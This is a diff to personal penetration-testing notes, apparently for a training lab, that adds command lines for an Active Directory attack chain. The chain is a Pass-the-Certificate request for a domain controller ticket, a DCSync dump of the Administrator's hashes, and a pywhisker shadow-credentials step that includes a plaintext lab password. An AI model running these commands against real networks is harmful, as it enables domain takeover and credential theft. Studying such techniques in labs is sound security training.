@@ -645,6 +645,17 @@ $ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
 $ python3 -m venv .venv
 $ source .venv/bin/activate
 $ pip3 install -r requirements.txt
+$ pip3 install -I git+https://github.com/wbond/oscrypto.git
 ```
-%% install gettgtpkinit.py to perform a  Pass-the-Certificate attack to obtain a TGT as DC01$.
+%% install gettgtpkinit.py to perform a  Pass-the-Certificate attack to obtain a TGT as DC01$. Last command in case you get a libcrypto error %%
 
+```
+$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+$ export KRB5CCNAME=/tmp/dc.ccache
+$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+```
+%% pass-the-certificate attack with gettgtpkinit then a dscync attack %%
+
+```
+$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+```
